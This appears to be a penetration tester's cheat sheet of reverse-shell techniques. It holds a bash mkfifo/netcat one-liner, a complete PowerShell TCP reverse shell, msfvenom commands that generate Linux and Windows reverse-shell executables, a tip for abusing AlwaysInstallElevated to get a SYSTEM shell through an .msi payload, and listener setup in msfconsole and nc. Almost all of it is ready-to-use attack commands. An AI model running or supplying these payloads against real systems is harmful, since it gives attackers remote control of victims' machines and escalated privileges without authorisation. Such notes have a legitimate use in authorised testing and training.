Note: if applicable, msfvenom is always preferred due to ease of use, however command line option is also listed here

Basic cmd-line rev shell:

-Bash Reverse Shell One-liner:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> > /tmp/f
```
-PowerShell Reverse Shell One-liner:
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

MSFvenom (Example):
-Linux x64 rev_shell:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > <fname>.elf
```
-Window x86 rev_shell:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > <fname>.exe
```
Note: MSFvenom support creating payload in this way for many extension and stuffs (including .war etc.)
Note2: One of the easy win in windows with msfvenom is to check if AlwaysInstallElevated = 1, if such is present we can generate a .msi payload and immediately gain a reverse shell in nt authority/system

General:

-Setting a listener for reverse shell in msfconsole(Default, Generate Session)
```
use exploit/multi/handler
set LHOST <ip>
set LPORT <port>
exploit
#Run Session
```
-Setting a generic listner via nc
```
nc -lvnp <port>
```
